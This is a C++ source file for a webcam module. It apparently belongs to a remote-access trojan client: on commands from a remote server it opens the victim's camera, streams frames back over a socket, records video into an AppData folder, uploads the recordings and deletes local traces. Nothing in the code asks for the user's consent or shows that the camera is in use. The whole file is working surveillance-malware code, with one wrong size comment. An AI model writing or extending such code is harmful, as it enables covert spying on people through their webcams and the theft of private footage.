#include "WebcamManager.h"

#include <utility>


// constructor -> information of recording and socket
WebcamManager::WebcamManager(ClientSocket &clientSocket, Download &download)
        : Handler(clientSocket), download(download) {
    ActionMap& actionMap = clientSocket.getActionMap();
    actionMap["START_WEBCAM"] = [&](nlohmann::json& json) {
        threadGen.runInNewThread(this, &WebcamManager::startWebcam,json);
    };
    actionMap["STOP_WEBCAM"] = [&](nlohmann::json& json) {
        threadGen.runInNewThread(this, &WebcamManager::stopWebcam);
    };
    actionMap["START_RECORDING_WEBCAM"] = [&](nlohmann::json& json) {
        threadGen.runInNewThread(this, &WebcamManager::startRecording);
    };
    actionMap["STOP_RECORDING_WEBCAM"] = [&](nlohmann::json& json) {
        threadGen.runInNewThread(this, &WebcamManager::stopRecording);
    };
    actionMap["SEND_WEBCAM_RECORDS"] = [&](nlohmann::json& json) {
        threadGen.runInNewThread(this, &WebcamManager::sendRecord, json);
    };


}

void WebcamManager::setConfiguration(nlohmann::json jsonObject) {
    std::string webcamName = jsonObject["selected_device"];
    channelID = jsonObject["channel_id"];
    webcamID = DeviceEnumerator::getIndexOfWebcamByName(webcamName);
    fragmented = jsonObject["is_fragmented"];
    FPS = jsonObject["fps"];
#ifdef WEBCAM
    locationOfVideos = Install::getAppDataPath() + L"\\"+ Converter::string2wstring(WEBCAM);
    fileName = this->locationOfVideos + L"\\" +( fragmented ? L"fragmented_video_" : L"one_take_video_");
#endif
}


// removing video temporary files
void WebcamManager::removeTempFiles(){
    if (std::filesystem::exists(locationOfVideos)) {
        for (const auto &entry: std::filesystem::directory_iterator(locationOfVideos)) {
            if (std::filesystem::is_regular_file(entry.path())) {
                std::filesystem::remove(entry.path());
            }
        }
    }
}

const int FRAGMENT_SIZE = 204800; // 64 KB
const uint8_t LAST_FRAGMENT = 0x02;
const uint8_t NOT_LAST_FRAGMENT = 0x01;

void WebcamManager::sendFrame(const cv::Mat& frame) {
    std::vector<uchar> imageBuff;
    cv::imencode(".jpeg", frame, imageBuff);

    std::vector<uint8_t> buffer(FRAGMENT_SIZE);
    size_t bytesRead = 0;
    size_t totalSize = imageBuff.size();
    size_t offset = 0;

    while (totalSize > 0) {
        buffer[0] = channelID;
        buffer[1] = NOT_LAST_FRAGMENT;

        if (totalSize >= FRAGMENT_SIZE - 2) {
            bytesRead = FRAGMENT_SIZE - 2;
        } else {
            bytesRead = totalSize;
            buffer[1] = LAST_FRAGMENT;
        }

        std::copy(imageBuff.begin() + offset, imageBuff.begin() + offset + bytesRead, buffer.begin() + 2);
        clientSocket.sendBytes(std::vector<uint8_t>(buffer.begin(), buffer.begin() + bytesRead + 2));
        offset += bytesRead;
        totalSize -= bytesRead;
    }
}


// sending video capture dimensions to server
void WebcamManager::sendDimensions(int width,int height){
    //stream.sendSize(width);
    //stream.sendSize(height);
}


void WebcamManager::stopWebcam(){
    if (initialized) {
        output.release();
        removeTempFiles();
    }
    streamingState.store(false);
}

void WebcamManager::startRecording(){
    if (!initialized) {
        std::wstring tempFileName = fileName;
        tempFileName.append(TimeCS::getCurrentDateTimeW()).append(L".avi");
        std::filesystem::path parentPath = std::filesystem::path(fileName).parent_path();
        std::filesystem::create_directory(parentPath);
        output = cv::VideoWriter(Converter::wstring2string(tempFileName), cv::VideoWriter::fourcc('M', 'J', 'P', 'G'), FPS,
                                 cv::Size(frameWidth, frameHeight));
        pathVector.push_back(tempFileName);
        initialized = true;
    }

}

void WebcamManager::stopRecording(){
    if (fragmented) {
        initialized.store(false);
        output.release();
    }
}

void WebcamManager::sendRecord(nlohmann::json jsonObject){
    if (!fragmented) output.release();
    jsonObject["from_path"] = Converter::wstring2string(locationOfVideos);
    download.downloadContent(jsonObject);
    removeTempFiles();
    initialized=false;
    pathVector.clear();
}


// starting webcam, sending information to server
void WebcamManager::startWebcam(nlohmann::json jsonObject) {
    setConfiguration(std::move(jsonObject));
    cv::Mat frame;
    cv::VideoCapture vid(webcamID);
    frameWidth = (int) vid.get(cv::CAP_PROP_FRAME_WIDTH);
    frameHeight = (int) vid.get(cv::CAP_PROP_FRAME_HEIGHT);

    //sendDimensions(frameWidth,frameHeight);
    streamingState.store(true);
    while (streamingState.load()) {
        vid >> frame;
        if (initialized.load()) output.write(frame);
        sendFrame(frame);
    }
    vid.release(); // release video
}



